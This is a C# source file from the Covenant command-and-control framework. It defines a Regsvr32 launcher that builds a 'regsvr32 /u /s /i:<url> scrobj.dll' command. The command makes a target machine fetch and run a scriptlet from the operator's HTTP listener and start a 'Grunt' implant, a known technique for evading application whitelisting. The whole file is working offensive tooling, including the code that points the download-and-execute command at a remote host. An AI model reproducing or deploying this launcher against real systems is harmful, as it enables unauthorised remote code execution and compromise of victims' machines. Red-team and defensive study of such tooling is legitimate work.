// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using Microsoft.CodeAnalysis;

using Covenant.Models.Listeners;

namespace Covenant.Models.Launchers
{
    public class Regsvr32Launcher : ScriptletLauncher
    {
        public string ParameterString { get; set; } = "/u /s";
        public string DllName { get; set; } = "scrobj.dll";

        public Regsvr32Launcher()
        {
            this.Name = "Regsvr32";
            this.Type = LauncherType.Regsvr32;
            this.Description = "Uses regsvr32.exe to launch a Grunt using a COM activated Delegate and ActiveXObjects.";
            this.ScriptType = ScriptletType.Scriptlet;
            this.OutputKind = OutputKind.DynamicallyLinkedLibrary;
        }

        protected override string GetLauncher(string code)
        {
            string launcher = "regsvr32 " + this.ParameterString + " /i:file.sct " + this.DllName;
            this.LauncherString = launcher;

            return this.LauncherString;
        }

        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
        {
            HttpListener httpListener = (HttpListener)listener;
            if (httpListener != null)
            {
				Uri hostedLocation = new Uri(httpListener.Url + hostedFile.Path);
                string launcher = "regsvr32 " + this.ParameterString + " /i:" + hostedLocation + " " + this.DllName;
                this.LauncherString = launcher;
                return launcher;
            }
            else { return ""; }
        }
    }
}
